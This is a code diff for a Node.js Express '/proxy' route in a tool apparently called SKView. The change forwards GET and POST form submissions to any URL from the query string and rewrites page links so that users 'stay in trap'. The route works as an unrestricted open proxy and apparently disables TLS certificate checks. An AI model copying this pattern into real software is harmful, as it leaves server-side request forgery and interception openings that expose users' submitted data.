@@ -554,28 +554,87 @@ setInterval(async () => {
 }, 30000); // Every 30s
 
 // ─── Asset Proxy Route ───────────────────────────────────────
-// Fetches portal assets (CSS, JS, images) server-side
-app.get('/proxy', async (req, res) => {
+// Handles GET (assets) and POST (form submissions) through SKView
+app.all('/proxy', async (req, res) => {
   const targetUrl = req.query.url;
   if (!targetUrl) return res.status(400).send('Missing url parameter');
 
   try {
-    const response = await axios.get(targetUrl, {
-      timeout: 5000,
-      responseType: 'arraybuffer',
-      headers: BROWSER_HEADERS,
+    const method = req.method.toLowerCase();
+    const config = {
+      method,
+      url: targetUrl,
+      timeout: 10000,
+      headers: { ...BROWSER_HEADERS },
       httpsAgent: insecureAgent
-    });
+    };
 
-    // Forward the content type
-    const contentType = response.headers['content-type'];
+    if (method === 'post') {
+      // Forward form data
+      config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+      config.data = new URLSearchParams(req.body).toString();
+    } else {
+      config.responseType = 'arraybuffer';
+    }
+
+    const response = await axios(config);
+
+    const contentType = response.headers['content-type'] || '';
     if (contentType) res.set('Content-Type', contentType);
-    
-    // Cache assets in browser for 1 hour
-    res.set('Cache-Control', 'public, max-age=3600');
-    res.send(response.data);
+
+    // If response is HTML (form submission result), rewrite URLs to stay in trap
+    if (method === 'post' && contentType.includes('text/html')) {
+      let html = typeof response.data === 'string' ? response.data : response.data.toString();
+      const $ = cheerio.load(html);
+      const baseUrl = new URL(targetUrl).origin;
+
+      $('[src]').each((i, el) => {
+        const src = $(el).attr('src');
+        if (!src || src.startsWith('data:') || src.startsWith('blob:')) return;
+        const resolved = src.startsWith('http') ? src : new URL(src, targetUrl).href;
+        $(el).attr('src', `/proxy?url=${encodeURIComponent(resolved)}`);
+      });
+
+      $('link[href]').each((i, el) => {
+        const href = $(el).attr('href');
+        if (!href || href.startsWith('data:') || href.startsWith('#')) return;
+        const resolved = href.startsWith('http') ? href : new URL(href, targetUrl).href;
+        $(el).attr('href', `/proxy?url=${encodeURIComponent(resolved)}`);
+      });
+
+      $('form[action]').each((i, el) => {
+        const action = $(el).attr('action');
+        if (!action) return;
+        const resolved = action.startsWith('http') ? action : new URL(action, targetUrl).href;
+        $(el).attr('action', `/proxy?url=${encodeURIComponent(resolved)}`);
+      });
+
+      $('a[href]').each((i, el) => {
+        const href = $(el).attr('href');
+        if (!href || href.startsWith('#') || href.startsWith('javascript:') || href.startsWith('mailto:')) return;
+        const resolved = href.startsWith('http') ? href : new URL(href, targetUrl).href;
+        $(el).attr('href', `/proxy?url=${encodeURIComponent(resolved)}`);
+      });
+
+      // Inject trap bar on result pages too
+      const trapBar = generateTrapBar('live', 0);
+      const finalHTML = $.html().replace(/<body[^>]*>/i, (match) => match + trapBar);
+
+      console.log(`[PROXY] ✅ POST ${targetUrl} → HTML rewritten + trap bar injected`);
+      res.send(finalHTML);
+    } else {
+      res.set('Cache-Control', 'public, max-age=3600');
+      res.send(response.data);
+    }
   } catch (e) {
-    res.status(404).send('');
+    console.log(`[PROXY] ❌ ${req.method} ${targetUrl} → ${e.message}`);
+    res.status(502).send(`
+      <div style="font-family:sans-serif;text-align:center;padding:60px;">
+        <h2>⏳ Portal is loading...</h2>
+        <p>SKView is retrying the connection.</p>
+        <button onclick="history.back()" style="padding:10px 30px;font-size:16px;cursor:pointer;">← Go Back</button>
+      </div>
+    `);
   }
 });
 
